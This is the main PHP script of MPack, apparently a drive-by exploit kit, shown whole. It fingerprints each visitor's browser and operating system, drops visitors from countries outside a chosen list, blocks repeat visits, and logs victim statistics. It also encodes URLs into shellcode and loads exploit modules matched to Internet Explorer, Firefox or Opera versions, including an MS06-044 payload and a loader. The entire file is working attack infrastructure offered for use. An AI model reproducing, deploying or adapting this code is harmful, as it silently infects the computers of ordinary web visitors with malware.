<?

//    MPack main script 

// .CONFIG
include ('settings.php'); //global settings



// .CODE
include ('cryptor.php'); //crypting module 

function detect_browser($HTTP_USER_AGENT) {
// Браузер и его версия
if (eregi("(opera) ([0-9]{1,2}.[0-9]{1,3}){0,1}", $HTTP_USER_AGENT, $match) || eregi("(opera/)([0-9]{1,2}.[0-9]{1,3}){0,1}", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Opera";
$browser[version] = $match[2];
}
elseif (eregi("(konqueror)/([0-9]{1,2}.[0-9]{1,3})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Konqueror";
$browser[version] = $match[2];
}
elseif (eregi("(lynx)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Lynx";
$browser[version] = $match[2];
}
elseif (eregi("(links) \(([0-9]{1,2}.[0-9]{1,3})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Links";
$browser[version] = $match[2];
}
elseif (eregi("(msie) ([0-9]{1,2}.[0-9]{1,3})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "MSIE";
$browser[version] = $match[2];
}
elseif (eregi("(netscape6)/(6.[0-9]{1,3})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Netscape";
$browser[version] = $match[2];
}
elseif (eregi("(mozilla)/([0-9]{1,2}.[0-9]{1,3})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Netscape(mozilla)";
$browser[version] = $match[2];
if (eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $HTTP_USER_AGENT, $match)) {
$browser[name] = "Firefox";
$browser[version] = $match[2];}


}
else {
$browser[name] = "Unknown";
$browser[version] = "Unknown";
}

// OS
if (eregi("linux", $HTTP_USER_AGENT)) $browser[os] = "Linux";
elseif (eregi("win32", $HTTP_USER_AGENT)) $browser[os] = "Windows";
elseif ((eregi("(win)([0-9]{2})", $HTTP_USER_AGENT, $match)) || (eregi("(windows) ([0-9]{2})", $HTTP_USER_AGENT, $match))) $browser[os] = "Windows ".$match[2];
elseif (eregi("(winnt)([0-9]{1,2}.[0-9]{1,2}){0,1}", $HTTP_USER_AGENT, $match)) $browser[os] = "Windows NT ".$match[2];
elseif (eregi("(windows nt)( ){0,1}([0-9]{1,2}.[0-9]{1,2}){0,1}", $HTTP_USER_AGENT, $match)) $browser[os] = "Windows NT ".$match[3];
elseif (eregi("mac", $HTTP_USER_AGENT)) $browser[os] = "Macintosh";
elseif (eregi("freebsd", $HTTP_USER_AGENT)) $browser[os] = "FreeBSD";
else $browser[os] = "Unknown";
if (eregi("(sv1)", $HTTP_USER_AGENT)) $browser[os] = "Windows NT 5.1 SP2";

return $browser;
}



function uEncode($s) //encodes url into shellcode
{
 $res=strtoupper(bin2hex($s));
 $g = round(strlen($res)/4);
 if ($g != (strlen($res)/4)) { $res.="00"; }
 $out = "";

 for ($i=0; $i<strlen($res); $i+=4) {
 $out.="%u".substr($res, $i+2, 2).substr($res, $i, 2);
  }
 return $out;
}


//checks current country with a list
//terminate if not in the list
function CheckCountry()
{
global $CoutryList;
$cci=GetCountryInfo(getenv("REMOTE_ADDR"));
if (strpos(strtoupper($CoutryList), $cci['a2'])==FALSE) {
				 //coutry not in the list
 				echo "^_^";
				exit;
						}

}


//checks and saves user's IP hashed with browser
//to avoid future browser's hangup
function CheckAddUser()
{
global $UseMySQL;
global $dbstats;

$ipua=md5(getenv("REMOTE_ADDR").getenv("HTTP_USER_AGENT"));

if ($UseMySQL==0) {
//text variant
	$fn="users.txt";
	if (file_exists($fn)) {
	$lines = file($fn);
		if (in_array($ipua."\n", $lines)==TRUE) {
		//got dup
		echo ";[";
		exit;
		}
	}

	//uniq record
	$fp=fopen($fn,"a");
	fwrite($fp,$ipua."\n");
	fclose($fp);
} else {

//mysql variant
 $query = "SELECT * FROM ".$dbstats."_users WHERE data='".$ipua."'";
 $res=mysql_query($query);
 $merr=mysql_error();
 	if ($merr!="") {
		//looks like no table, create & add data
		$query="CREATE TABLE `".$dbstats."_users` (`data` VARCHAR( 32 ) NOT NULL ) ENGINE = MYISAM ;";
		mysql_query($query);
		  $query = "INSERT INTO ".$dbstats."_users VALUES ('".$ipua."')";
		  mysql_query($query);
		
	} else {
	//table found, check returned set count
	$rcount=@mysql_num_rows($res);
	if ($rcount>0) {
		//found data, prevent view
		echo ":[";
		exit;
	} else {
		//not found, add
		$query = "INSERT INTO ".$dbstats."_users VALUES ('".$ipua."')";
		mysql_query($query);
	}
	}

}

}



// Windows NT 5.0 = Win2000
// Windows NT 5.1 = WinXP sp0,1
// Windows NT 5.1 SP2 = WinXP sp2 (Windows NT 5.1; SV1) under IE
// Windows NT 5.2 = Win2003 build 164/16.6
$browser = detect_browser(getenv("HTTP_USER_AGENT"));


if ($OnlyDefiniedCoutries==1) { CheckCountry(); }


if ($BlockDuplicates==1) { CheckAddUser(); }

AddIP("all");
if ($UseMySQL==1) { //geo2ip stat on traff
$id="traff";
$cci=GetCountryInfo(getenv("REMOTE_ADDR"));
//increase hits to this country
  $query = "UPDATE ".$dbstats." SET count = count + 1 WHERE a2 = '".$cci['a2']."' AND statid = '".$id."'";
  $r = mysql_query($query);
  if (mysql_affected_rows() == 0)
	{
	$query = "INSERT INTO ".$dbstats." VALUES ('".$id."', '".$cci['a2']."', '".$cci['name']."', 1)";
	mysql_query($query);
	}  

//browser-type count
  $query = "UPDATE ".$dbstats."_brs SET count = count + 1 WHERE browser = '".$browser[name]."'";
  $r = mysql_query($query);
  if (mysql_affected_rows() == 0)
	{
	$query = "INSERT INTO ".$dbstats."_brs VALUES ('".$browser[name]."', 1)";
	mysql_query($query);
	}  


}


if ($CountReferers==1) {  //referer count
$ref="_".substr(@mysql_real_escape_string(getenv("HTTP_REFERER")),0,100);
  $query = "UPDATE ".$dbstats."_refs SET count = count + 1 WHERE referer = '".$ref."'";
  $r = mysql_query($query);
  if (mysql_affected_rows() == 0)
	{
	$query = "INSERT INTO ".$dbstats."_refs VALUES ('".$ref."', 1)";
	mysql_query($query);
	}  



}



//extended loader's subsystem
if (isset($_GET['id'])) { 
$LoaderPath=$LoaderPath."?id=".$_GET['id'];
}


//exploits combination
if ($browser[name]=="MSIE") { 
  if ($browser[os]!="Windows NT 5.0") { AddIP("0day"); include 'crypt.php';   include 'megapack1.php';   } 
  if ($browser[os]=="Windows NT 5.0") { AddIP("jar");  include 'ms06-044_w2k.php';  include 'megapack1.php';  } 
}

if ($browser[name]=="Firefox") { AddIP("firefox"); include 'ff.php'; }

if ($browser[name]=="Opera") {
  if (substr($browser[version], 0, 1)<"8") { AddIP("opera7"); include 'o7.php'; }
}



//if ($browser[name]!="Opera") && ($browser[name]!="Firefox") && ($browser[name]!="MSIE") {  include 'megapack1.php'; }

//echo getenv("HTTP_USER_AGENT")."<br>";
//echo "Browser: ".$browser[name]."<br> Browser Ver: ".$browser[version]."<br>OS: ".$browser[os];


?>